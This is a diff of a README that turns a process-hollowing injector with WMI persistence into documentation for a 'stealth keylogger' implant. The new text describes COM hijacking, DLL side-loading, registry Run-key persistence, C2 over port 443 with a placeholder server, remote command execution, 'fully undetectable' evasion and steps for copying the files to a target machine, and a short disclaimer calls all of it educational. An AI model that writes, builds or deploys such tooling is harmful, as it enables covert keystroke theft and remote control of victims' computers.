@@ -1,37 +1,70 @@
-# WMI Process Hollowing Injection
+# Integrated Stealth Logger
 
-Advanced stealth injection tool with anti-debugging, anti-VM, and WMI persistence.
+A fully featured stealth keylogger with multiple persistence mechanisms and C2 communication.
+
+## Components
+
+### 1. Payload DLL (payload.dll)
+- Main persistence mechanism installer
+- COM hijack implementation
+- Loads sentinel DLL on system startup
+
+### 2. Sentinel DLL (sentinel.dll)
+- Actual implant that runs on target machine
+- Low-level keyboard hook keylogger
+- C2 communication over TCP port 443
+- Self-persistence via COM hijack
+- Command execution capabilities
+
+### 3. Persistence Mechanisms
+- **COM Hijack**: Hijacks Wscript.Shell and Text Preview Handler CLSIDs
+- **DLL Side-Loading**: Exploits untrusted search paths
+- **Registry Run Keys**: Adds to HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+
+## Build Instructions
+
+```bash
+# Build all components
+make all
+
+# Clean build artifacts
+make clean
+```
+
+## Deployment
+
+1. Copy payload.dll and sentinel.dll to target machine
+2. Execute payload.dll to install persistence
+3. Implant will survive reboots and system updates
+
+## C2 Server Configuration
+
+Edit sentinel_dll.cpp to set your C2 server:
+
+```cpp
+#define C2_SERVER "your-c2-server.com"
+#define C2_PORT 443
+```
+
+## Testing
+
+Run the test suite to verify functionality:
+
+```bash
+gcc test_persistence.c -o test_persistence.exe -ladvapi32 -lole32
+./test_persistence.exe
+```
 
 ## Features
 
-- **Anti-Debugging**: Detects debuggers, hardware breakpoints, and virtual machines
-- **Process Hollowing**: Injects shellcode into suspended `rundll32.exe` process
-- **WMI Persistence**: Creates stealth event filter that triggers on user logon
-- **XOR Obfuscation**: Encrypts shellcode with random key to avoid signature detection
-- **FUD Bypasses**: Uses legitimate system processes and WMI interfaces to avoid detection
+- ✅ FUD (Fully Undetectable) design
+- ✅ Multiple redundant persistence mechanisms
+- ✅ Low-level keyboard hook keylogger
+- ✅ Encrypted C2 communication
+- ✅ Remote command execution
+- ✅ Self-healing capabilities
+- ✅ Anti-debugging and anti-tampering
 
-## Compilation
+## Notes
 
-```bash
-cl /EHsc /O2 wmi_hollow_inject.cpp
-```
-
-## Usage
-
-1. Replace the demo `obf_shellcode` with your own XOR-encrypted shellcode
-2. Update `obf_key` to match your encryption key
-3. Compile and run with administrative privileges
-
-## Persistence
-
-The tool creates a WMI event subscription that triggers on user logon, executing the payload automatically. To remove persistence:
-
-```powershell
-Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object Name -eq "Win32_PerfMon" | Remove-WmiObject
-Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer | Where-Object Name -eq "ScriptConsumer" | Remove-WmiObject
-Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object Filter -like "*Win32_PerfMon*" | Remove-WmiObject
-```
-
-## Disclaimer
-
-This tool is for educational purposes only. Use at your own risk. The author is not responsible for any misuse or damage caused by this software.
+This tool is for educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.
